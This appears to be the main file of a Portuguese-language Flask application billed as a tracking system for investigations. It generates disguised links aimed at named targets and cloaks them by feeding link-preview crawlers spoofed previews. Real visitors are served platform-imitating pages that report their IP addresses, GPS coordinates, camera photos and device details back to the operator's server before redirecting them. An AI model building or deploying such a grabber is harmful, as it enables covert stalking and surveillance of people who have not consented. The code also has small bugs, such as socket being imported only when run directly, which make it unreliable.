"""
Sistema de Rastreamento para Investigações - Aplicação Principal
Versão Segura com Autenticação, Criptografia e Auditoria

Este sistema coleta dados de dispositivos através de links personalizados
para auxiliar em investigações devidamente autorizadas.
"""

import os
import re
import uuid
import base64
import json
from datetime import datetime, timedelta
from urllib.parse import urlparse

import pytz
import requests
from PIL import Image
from bs4 import BeautifulSoup
from werkzeug.utils import secure_filename
from flask import (
    Flask, request, render_template, jsonify, redirect,
    url_for, flash, session, send_from_directory
)
from flask_wtf import CSRFProtect
from dotenv import load_dotenv

# Importar módulos customizados
from config import get_config
from app.models import (
    db, Link, IPInicial, RegistroAcesso, RegistroBot, 
    AuditLog, Usuario, horario_brasilia
)
from app.services.auth_service import AuthService, bcrypt, limiter
from app.utils.validators import (
    validar_url, validar_slug, gerar_slug, extensao_permitida,
    sanitizar_filename, analisar_user_agent, detectar_bot,
    gerar_link_google_maps
)
from app.utils.logger import configurar_logging, log_auditoria, log_acesso_rastreamento

# Carregar variáveis de ambiente
load_dotenv()

# ===== INICIALIZAÇÃO DA APLICAÇÃO =====

app = Flask(__name__, instance_relative_config=True)

# Carregar configuração baseada no ambiente
config_name = os.environ.get('FLASK_ENV', 'development')
app.config.from_object(get_config(config_name))

# Validar configurações críticas em produção
if config_name == 'production':
    get_config(config_name).init_app(app)

# Inicializar extensões
db.init_app(app)
bcrypt.init_app(app)
limiter.init_app(app)
csrf = CSRFProtect(app)

# Configurar logging
with app.app_context():
    configurar_logging(app)

# Garantir que diretórios necessários existem
os.makedirs(app.instance_path, exist_ok=True)
os.makedirs(app.config['PREVIEW_UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['CAPTURE_UPLOAD_FOLDER'], exist_ok=True)
os.makedirs('logs', exist_ok=True)

# Criar tabelas do banco de dados
with app.app_context():
    db.create_all()
    # Criar usuário admin inicial se não existir
    try:
        AuthService.criar_usuario_admin_inicial()
    except ValueError as e:
        app.logger.warning(f"Não foi possível criar usuário admin: {e}")


# ===== DECORADOR DE AUTENTICAÇÃO =====

def login_requerido(f):
    """Decorador para rotas que exigem autenticação"""
    from functools import wraps
    
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get("logado"):
            flash("Você precisa estar logado para acessar esta página.", "warning")
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated_function


# ===== ROTAS DE AUTENTICAÇÃO =====

@app.route("/", methods=["GET", "POST"])
@limiter.limit("10 per minute")
def login():
    """Rota para login do usuário com proteção contra força bruta"""
    if session.get("logado"):
        return redirect(url_for("gerenciar"))
    
    if request.method == "POST":
        username = request.form.get("usuario", "").strip()
        password = request.form.get("senha", "")
        ip_origem = request.remote_addr
        
        if not username or not password:
            flash("Usuário e senha são obrigatórios.", "danger")
            return render_template("login.html")
        
        # Autenticar usando o serviço seguro
        sucesso, usuario, mensagem_erro = AuthService.autenticar(username, password, ip_origem)
        
        if sucesso:
            session["logado"] = True
            session["username"] = usuario.username
            session["is_admin"] = usuario.is_admin
            session.permanent = True  # Usar PERMANENT_SESSION_LIFETIME
            
            flash(f"Bem-vindo, {usuario.username}!", "success")
            app.logger.info(f"Login bem-sucedido: {username} ({ip_origem})")
            
            return redirect(url_for("gerenciar"))
        else:
            flash(mensagem_erro, "danger")
            app.logger.warning(f"Login falhou: {username} ({ip_origem}) - {mensagem_erro}")
            return render_template("login.html")
    
    return render_template("login.html")


@app.route("/logout")
def logout():
    """Rota para logout do usuário"""
    username = session.get("username", "unknown")
    session.clear()
    flash("Você foi desconectado.", "info")
    app.logger.info(f"Logout: {username}")
    
    # Registrar auditoria
    AuthService.registrar_auditoria(
        usuario=username,
        acao='logout',
        detalhes={'timestamp': horario_brasilia().isoformat()},
        ip_origem=request.remote_addr
    )
    
    return redirect(url_for("login"))


# ===== ROTAS DO PAINEL ADMINISTRATIVO =====

@app.route("/gerenciar")
@login_requerido
def gerenciar():
    """Página principal do painel de gerenciamento"""
    # Estatísticas rápidas
    total_links = Link.query.count()
    total_acessos = RegistroAcesso.query.count()
    total_ips_iniciais = IPInicial.query.count()
    
    # Links recentes
    links_recentes = Link.query.order_by(Link.created_at.desc()).limit(5).all()
    
    # Acessos recentes
    acessos_recentes = RegistroAcesso.query.order_by(RegistroAcesso.data_hora.desc()).limit(5).all()
    
    return render_template("gerenciar.html",
                         total_links=total_links,
                         total_acessos=total_acessos,
                         total_ips_iniciais=total_ips_iniciais,
                         links_recentes=links_recentes,
                         acessos_recentes=acessos_recentes)


@app.route("/todos_links")
@login_requerido
def todos_links():
    """Exibe a lista de todos os links criados"""
    links = Link.query.order_by(Link.created_at.desc()).all()
    
    # Adicionar contagem de acessos para cada link
    for link in links:
        link.num_acessos = link.registros_acesso.count()
        link.num_ips_iniciais = link.ips_iniciais.count()
    
    return render_template("todos_links.html", links=links)


@app.route("/excluir_link/<int:link_id>", methods=["POST"])
@login_requerido
def excluir_link(link_id: int):
    """Exclui um link e todos os dados associados"""
    link = Link.query.get_or_404(link_id)
    slug = link.slug
    
    # Excluir arquivo de imagem de preview, se existir
    if link.preview_imagem:
        # Extrair apenas o nome do arquivo da URL
        try:
            parsed = urlparse(link.preview_imagem)
            filename = os.path.basename(parsed.path)
            caminho_imagem = os.path.join(app.config['PREVIEW_UPLOAD_FOLDER'], filename)
            
            if os.path.exists(caminho_imagem):
                os.remove(caminho_imagem)
                app.logger.info(f"Imagem de preview excluída: {caminho_imagem}")
        except Exception as e:
            app.logger.error(f"Erro ao excluir imagem de preview: {e}")
    
    # A exclusão em cascata nos modelos cuidará de IPInicial e RegistroAcesso
    db.session.delete(link)
    
    try:
        db.session.commit()
        flash(f"Link '{slug}' e dados associados excluídos com sucesso!", "success")
        app.logger.info(f"Link excluído: {slug}")
        
        # Registrar auditoria
        AuthService.registrar_auditoria(
            usuario=session.get('username', 'unknown'),
            acao='excluir_link',
            detalhes={'slug': slug, 'link_id': link_id},
            ip_origem=request.remote_addr
        )
    except Exception as e:
        db.session.rollback()
        flash(f"Erro ao excluir link '{slug}': {e}", "danger")
        app.logger.error(f"Erro ao excluir link {slug}: {e}")
    
    return redirect(url_for('todos_links'))


@app.route("/painel")
@login_requerido
def painel():
    """Exibe o painel com registros de acesso e IPs iniciais"""
    # Obter registros com descriptografia automática
    registros_acesso = RegistroAcesso.query.order_by(RegistroAcesso.data_hora.desc()).all()
    ips_iniciais = IPInicial.query.order_by(IPInicial.data_hora.desc()).all()
    
    # Descriptografar dados para exibição
    for registro in registros_acesso:
        registro.ip_v4_decrypted = registro.get_ip_v4()
        registro.ip_v6_decrypted = registro.get_ip_v6()
        registro.latitude_decrypted = registro.get_latitude()
        registro.longitude_decrypted = registro.get_longitude()
        
        # Gerar link do Google Maps se tiver coordenadas
        if registro.latitude_decrypted and registro.longitude_decrypted:
            registro.google_maps_url = gerar_link_google_maps(
                registro.latitude_decrypted,
                registro.longitude_decrypted
            )
    
    for ip in ips_iniciais:
        ip.ip_v4_decrypted = ip.get_ip_v4()
        ip.ip_v6_decrypted = ip.get_ip_v6()
    
    # Criar um dicionário para mapear slug para nome_investigado
    todos_links = Link.query.all()
    links_dict = {link.slug: link.nome_investigado for link in todos_links}
    
    return render_template("painel.html",
                         registros=registros_acesso,
                         ips_iniciais=ips_iniciais,
                         links=links_dict)


# ===== ROTAS DE CRIAÇÃO E UPLOAD =====

@app.route("/criar_link", methods=["GET", "POST"])
@login_requerido
def criar_link():
    """Rota para criar um novo link de rastreamento"""
    if request.method == "POST":
        slug_fornecido = request.form.get('slug', '').strip()
        destino = request.form.get('destino', '').strip()
        nome_investigado = request.form.get('nome_investigado', '').strip()
        plataforma = request.form.get('plataforma', 'padrao')
        operacao = request.form.get('operacao', '').strip()
        observacoes = request.form.get('observacoes', '').strip()
        
        # Campos da pré-visualização personalizada
        preview_titulo = request.form.get('preview_titulo', '').strip()
        preview_descricao = request.form.get('preview_descricao', '').strip()
        preview_imagem_url = request.form.get('preview_imagem_url', '').strip()
        
        # Validação da URL de destino
        valido, erro = validar_url(destino)
        if not valido:
            flash(f"URL inválida: {erro}", "danger")
            return redirect(url_for('criar_link'))
        
        # Gerar ou validar slug
        if slug_fornecido:
            valido, erro = validar_slug(slug_fornecido)
            if not valido:
                flash(f"Slug inválido: {erro}", "danger")
                return redirect(url_for('criar_link'))
            
            # Verifica se o slug já existe
            if Link.query.filter_by(slug=slug_fornecido).first():
                flash(f"O slug '{slug_fornecido}' já está em uso. Por favor, escolha outro.", "warning")
                return redirect(url_for('criar_link'))
            
            slug = slug_fornecido
        else:
            # Gera slug aleatório único
            slug = gerar_slug(app.config.get('DEFAULT_SLUG_LENGTH', 8))
            while Link.query.filter_by(slug=slug).first():
                slug = gerar_slug(app.config.get('DEFAULT_SLUG_LENGTH', 8))
        
        # Criar novo link
        novo_link = Link(
            slug=slug,
            destino=destino,
            nome_investigado=nome_investigado,
            plataforma=plataforma,
            preview_titulo=preview_titulo,
            preview_descricao=preview_descricao,
            preview_imagem=preview_imagem_url,
            criado_por=session.get('username', 'unknown'),
            operacao=operacao,
            observacoes=observacoes
        )
        
        try:
            db.session.add(novo_link)
            db.session.commit()
            
            flash(f"Link criado com sucesso! Slug: {slug}", "success")
            app.logger.info(f"Link criado: {slug} por {session.get('username')}")
            
            # Registrar auditoria
            AuthService.registrar_auditoria(
                usuario=session.get('username', 'unknown'),
                acao='criar_link',
                detalhes={
                    'slug': slug,
                    'investigado': nome_investigado,
                    'operacao': operacao,
                    'plataforma': plataforma
                },
                ip_origem=request.remote_addr
            )
            
            # Gerar link completo
            link_completo = url_for('rastrear_link', slug=slug, _external=True)
            flash(f"Link completo: {link_completo}", "info")
            
            return redirect(url_for('todos_links'))
        except Exception as e:
            db.session.rollback()
            flash(f"Erro ao criar link: {e}", "danger")
            app.logger.error(f"Erro ao criar link {slug}: {e}", exc_info=True)
            return redirect(url_for('criar_link'))
    
    return render_template('criar_link.html')


@app.route("/upload_imagem", methods=["POST"])
@csrf.exempt  # Exempt apenas para esta rota específica de upload
def upload_imagem():
    """
    Rota para receber e processar o upload de imagens de preview.
    Redimensiona, converte para JPG e salva.
    Retorna a URL pública da imagem salva.
    """
    if "imagem" not in request.files:
        return jsonify({"erro": "Nenhuma imagem enviada"}), 400
    
    arquivo = request.files["imagem"]
    
    if arquivo.filename == "":
        return jsonify({"erro": "Nome de arquivo vazio"}), 400
    
    if arquivo and extensao_permitida(arquivo.filename, app.config['ALLOWED_EXTENSIONS']):
        try:
            # Gera um nome único para o arquivo JPG
            nome_unico = f"{uuid.uuid4().hex}.jpg"
            caminho_completo = os.path.join(app.config["PREVIEW_UPLOAD_FOLDER"], nome_unico)
            
            # Abre, converte e redimensiona a imagem
            img = Image.open(arquivo)
            img = img.convert("RGB")  # Garante que seja RGB antes de salvar como JPG
            
            max_size = app.config.get('MAX_IMAGE_SIZE', (1200, 1200))
            img.thumbnail(max_size, Image.Resampling.LANCZOS)
            
            # Salva a imagem otimizada como JPG
            quality = app.config.get('IMAGE_QUALITY', 85)
            img.save(caminho_completo, app.config.get('IMAGE_FORMAT', 'JPEG'), quality=quality)
            
            # Constrói a URL pública
            url_imagem = url_for('static', filename=f'previews/{nome_unico}', _external=True)
            
            app.logger.info(f"Imagem de preview salva: {nome_unico}")
            return jsonify({"url": url_imagem}), 200
            
        except Exception as e:
            app.logger.error(f"Erro ao processar imagem de preview: {e}", exc_info=True)
            return jsonify({"erro": f"Erro ao processar imagem: {str(e)}"}), 500
    else:
        extensoes = ", ".join(app.config['ALLOWED_EXTENSIONS'])
        return jsonify({"erro": f"Extensão não permitida. Use: {extensoes}"}), 400


# ===== CONTINUA NA PRÓXIMA PARTE =====
# (As rotas de rastreamento serão adicionadas em seguida)
# ===== CONTINUAÇÃO DO APP.PY - PARTE 2 =====
# ===== ROTAS DE RASTREAMENTO E COLETA DE DADOS =====

@app.route("/link/<slug>")
@app.route("/r/<slug>")
@csrf.exempt  # Links de rastreamento não usam CSRF
def rastrear_link(slug: str):
    """
    Rota principal para o link de rastreamento.
    Serve o template apropriado (preview para bots, template de plataforma para usuários).
    """
    link = Link.query.filter_by(slug=slug).first_or_404()
    user_agent = request.headers.get("User-Agent", "").lower()
    
    # Detectar se é um bot
    is_bot = detectar_bot(user_agent, app.config.get('BOT_USER_AGENTS'))
    
    if is_bot:
        app.logger.info(f"Acesso de bot ao slug '{slug}' (UA: {user_agent[:100]}...)")
        log_acesso_rastreamento(slug, request.remote_addr, 'bot', f"UA: {user_agent[:50]}")
        
        # Registrar bot no banco
        try:
            bot_registro = RegistroBot(
                slug=slug,
                user_agent=user_agent[:300],
                timestamp=horario_brasilia()
            )
            bot_registro.set_ip(request.remote_addr)
            
            db.session.add(bot_registro)
            db.session.commit()
        except Exception as e:
            app.logger.error(f"Erro ao registrar bot: {e}")
            db.session.rollback()
        
        # Prioriza o preview personalizado, se existir
        if link.preview_titulo and link.preview_imagem:
            return render_template("preview_real.html",
                titulo=link.preview_titulo,
                descricao=link.preview_descricao or "Clique para visualizar o conteúdo.",
                imagem=link.preview_imagem,
                url_destino=link.destino
            )
        
        # Tenta buscar as OG tags da página de destino
        try:
            headers = {
                "User-Agent": "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
            }
            timeout = app.config.get('REQUEST_TIMEOUT', 10)
            resposta = requests.get(link.destino, headers=headers, timeout=timeout)
            resposta.raise_for_status()
            
            soup = BeautifulSoup(resposta.text, "html.parser")
            
            og_title_tag = soup.find("meta", property="og:title")
            og_desc_tag = soup.find("meta", property="og:description")
            og_image_tag = soup.find("meta", property="og:image")
            og_url_tag = soup.find("meta", property="og:url")
            
            og_title = og_title_tag["content"] if og_title_tag and og_title_tag.get("content") else "Acesse este link"
            og_desc = og_desc_tag["content"] if og_desc_tag and og_desc_tag.get("content") else "Clique para visualizar o conteúdo."
            og_image = og_image_tag["content"] if og_image_tag and og_image_tag.get("content") else url_for('static', filename='fallback.jpg', _external=True)
            og_url = og_url_tag["content"] if og_url_tag and og_url_tag.get("content") else link.destino
            
            return render_template("preview_real.html",
                titulo=og_title,
                descricao=og_desc,
                imagem=og_image,
                url_destino=link.destino,
                og_url=og_url
            )
            
        except requests.exceptions.RequestException as e:
            app.logger.error(f"Erro ao buscar OG tags para '{link.destino}': {e}")
        except Exception as e:
            app.logger.error(f"Erro ao processar OG tags para '{link.destino}': {e}", exc_info=True)
        
        # Fallback final para preview básico
        return render_template("preview_fallback.html", url_destino=link.destino)
    
    # Visitante real: serve o template da plataforma escolhida
    app.logger.info(f"Acesso de usuário real ao slug '{slug}' (UA: {user_agent[:100]}...)")
    log_acesso_rastreamento(slug, request.remote_addr, 'usuario', f"Plataforma: {link.plataforma}")
    
    # Determinar template
    if link.plataforma and link.plataforma != 'default':
        template_escolhido = f"{link.plataforma.lower()}.html"
    else:
        template_escolhido = "padrao.html"
    
    # Verificar se o template existe
    template_path = os.path.join(app.root_path, 'templates', template_escolhido)
    if not os.path.exists(template_path):
        app.logger.warning(f"Template '{template_escolhido}' não encontrado para o slug '{slug}'. Usando 'padrao.html'.")
        template_escolhido = "padrao.html"
    
    return render_template(template_escolhido, slug=slug, destino=link.destino, link=link)


@app.route("/coletar_ip_inicial", methods=["POST"])
@csrf.exempt  # Coleta de dados não usa CSRF
def coletar_ip_inicial():
    """Recebe e salva dados de IP iniciais enviados pelo JavaScript no cliente"""
    dados = request.get_json()
    
    if not dados or 'slug' not in dados:
        app.logger.warning("Tentativa de coletar_ip_inicial sem dados ou slug.")
        return jsonify({"status": "erro", "mensagem": "Dados inválidos"}), 400
    
    slug = dados.get("slug")
    ip_v4 = dados.get("ip_v4")
    ip_v6 = dados.get("ip_v6")
    porta = dados.get("porta", "0")
    
    try:
        porta = int(porta) if porta else 0
    except (ValueError, TypeError):
        porta = 0
    
    # Criar registro
    novo_ip = IPInicial(
        slug=slug,
        porta=porta,
        data_hora=horario_brasilia()
    )
    
    # Usar métodos de criptografia
    novo_ip.set_ip_v4(ip_v4)
    novo_ip.set_ip_v6(ip_v6)
    
    try:
        db.session.add(novo_ip)
        db.session.commit()
        
        app.logger.info(f"IP inicial coletado para slug '{slug}': {ip_v4 or ip_v6}")
        log_acesso_rastreamento(slug, ip_v4 or ip_v6 or 'unknown', 'ip_inicial', f"Porta: {porta}")
        
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        db.session.rollback()
        app.logger.error(f"Erro ao salvar IP inicial para slug '{slug}': {e}", exc_info=True)
        return jsonify({"status": "erro", "mensagem": "Erro ao salvar dados"}), 500


@app.route("/coletar_dados", methods=["POST"])
@csrf.exempt  # Coleta de dados não usa CSRF
def coletar_dados():
    """
    Recebe e salva dados detalhados de acesso (localização, foto, etc.)
    enviados pelo JavaScript no cliente após interação.
    """
    dados = request.get_json()
    
    if not dados or 'slug' not in dados:
        app.logger.warning("Tentativa de coletar_dados sem dados ou slug.")
        return jsonify({"status": "erro", "mensagem": "Dados inválidos"}), 400
    
    slug = dados.get("slug")
    foto_base64 = dados.get("foto_base64")
    nome_arquivo_foto = None
    
    # Processar e salvar imagem base64, se enviada
    if foto_base64:
        try:
            # Remove o prefixo 'data:image/jpeg;base64,' ou similar
            if ',' in foto_base64:
                base64_data = foto_base64.split(",")[-1]
            else:
                base64_data = foto_base64
            
            imagem_bytes = base64.b64decode(base64_data)
            
            # Gera nome único
            timestamp_str = datetime.utcnow().strftime('%Y%m%d%H%M%S%f')
            nome_arquivo_foto = f"{slug}_{timestamp_str}.jpg"
            caminho_completo_foto = os.path.join(app.config['CAPTURE_UPLOAD_FOLDER'], nome_arquivo_foto)
            
            # Salva o arquivo
            with open(caminho_completo_foto, "wb") as f:
                f.write(imagem_bytes)
            
            app.logger.info(f"Foto capturada salva para slug '{slug}': {nome_arquivo_foto}")
            
        except Exception as e:
            app.logger.error(f"Erro ao processar ou salvar imagem base64 para slug '{slug}': {e}", exc_info=True)
            nome_arquivo_foto = None
    
    # Analisar User Agent
    user_agent_str = dados.get("navegador", "")
    ua_info = analisar_user_agent(user_agent_str)
    
    # Criar registro de acesso
    novo_registro = RegistroAcesso(
        slug=slug,
        foto_arquivo=nome_arquivo_foto,
        sistema=dados.get("sistema") or ua_info.get("sistema", "Desconhecido"),
        navegador=user_agent_str[:200] if user_agent_str else None,
        idioma=dados.get("idioma"),
        fuso_horario=dados.get("fusoHorario"),
        conexao=dados.get("conexao"),
        largura_tela=int(dados.get("larguraTela", 0) or 0),
        altura_tela=int(dados.get("alturaTela", 0) or 0),
        porta_r=dados.get("porta"),
        tempo_segundos=int(dados.get("tempoSegundos", 0) or 0),
        ip_servidor=dados.get("ip_servidor"),
        porta_servidor=dados.get("porta_servidor"),
        data_hora=horario_brasilia()
    )
    
    # Usar métodos de criptografia para dados sensíveis
    novo_registro.set_ip_v4(dados.get("ip_v4"))
    novo_registro.set_ip_v6(dados.get("ip_v6"))
    novo_registro.set_latitude(dados.get("latitude"))
    novo_registro.set_longitude(dados.get("longitude"))
    
    try:
        db.session.add(novo_registro)
        db.session.commit()
        
        ip_display = dados.get("ip_v4") or dados.get("ip_v6") or "unknown"
        app.logger.info(f"Dados detalhados coletados para slug '{slug}' (IP: {ip_display})")
        log_acesso_rastreamento(slug, ip_display, 'dados_completos', 
                                f"Foto: {'Sim' if nome_arquivo_foto else 'Não'}, GPS: {dados.get('latitude') is not None}")
        
        # Retorna o destino final para o JS redirecionar
        link = Link.query.filter_by(slug=slug).first()
        destino = link.destino if link else url_for('login', _external=True)
        
        return jsonify({
            "status": "ok",
            "destino": destino,
            "foto_nome": nome_arquivo_foto
        }), 200
    except Exception as e:
        db.session.rollback()
        app.logger.error(f"Erro ao salvar dados detalhados para slug '{slug}': {e}", exc_info=True)
        return jsonify({"status": "erro", "mensagem": "Erro ao salvar dados"}), 500


# ===== ROTA DE REDIRECIONAMENTO FINAL =====

@app.route("/redir/<slug>")
@csrf.exempt
def redirecionar(slug: str):
    """
    Página intermediária para garantir que o redirecionamento final ocorra
    após a coleta de dados pelo JavaScript.
    """
    link = Link.query.filter_by(slug=slug).first()
    destino = link.destino if link else url_for('login', _external=True)
    
    return render_template("redirect.html", destino=destino)


# ===== ROTA DE INFORMAÇÃO DO SERVIDOR =====

@app.route('/info_servidor')
@csrf.exempt
def info_servidor():
    """Retorna informações do servidor para o JavaScript"""
    host = request.host.split(':')
    try:
        ip_servidor = socket.gethostbyname(host[0])
    except Exception:
        ip_servidor = host[0]
    
    if len(host) > 1:
        porta_servidor = host[1]
    else:
        porta_servidor = '443' if request.scheme == 'https' else '80'
    
    return jsonify({'ip_servidor': ip_servidor, 'porta_servidor': porta_servidor})


# ===== OUTRAS ROTAS =====

@app.route("/ping")
@csrf.exempt
def ping():
    """Health check endpoint"""
    return jsonify({"status": "ok", "timestamp": horario_brasilia().isoformat()}), 200


# ===== MANIPULADORES DE ERRO =====

@app.errorhandler(404)
def nao_encontrado(e):
    """Manipulador personalizado para erro 404"""
    app.logger.warning(f"404 - Página não encontrada: {request.url}")
    return render_template('404.html'), 404 if os.path.exists(os.path.join(app.root_path, 'templates', '404.html')) else ("Página não encontrada", 404)


@app.errorhandler(500)
def erro_interno(e):
    """Manipulador personalizado para erro 500"""
    app.logger.error(f"500 - Erro interno do servidor: {e}", exc_info=True)
    return render_template('500.html'), 500 if os.path.exists(os.path.join(app.root_path, 'templates', '500.html')) else ("Erro interno do servidor", 500)


@app.errorhandler(429)
def rate_limit_exceeded(e):
    """Manipulador para excesso de requisições (rate limiting)"""
    app.logger.warning(f"429 - Rate limit excedido: {request.remote_addr}")
    return jsonify({
        "erro": "Muitas requisições. Por favor, aguarde um momento e tente novamente.",
        "status": 429
    }), 429


# ===== CONTEXTO DE TEMPLATE =====

@app.context_processor
def utility_processor():
    """Adiciona funções utilitárias aos templates"""
    return {
        'now': horario_brasilia,
        'len': len
    }


# ===== INICIALIZAÇÃO =====

if __name__ == "__main__":
    import socket  # Movido para cá para evitar import desnecessário no topo
    
    # Em produção, use um servidor WSGI como Gunicorn
    # gunicorn -w 4 -b 0.0.0.0:5000 app:app
    
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_ENV') == 'development'
    
    app.logger.info(f"Iniciando servidor na porta {port} (Debug: {debug})")
    
    app.run(
        debug=debug,
        host='0.0.0.0',
        port=port
    )
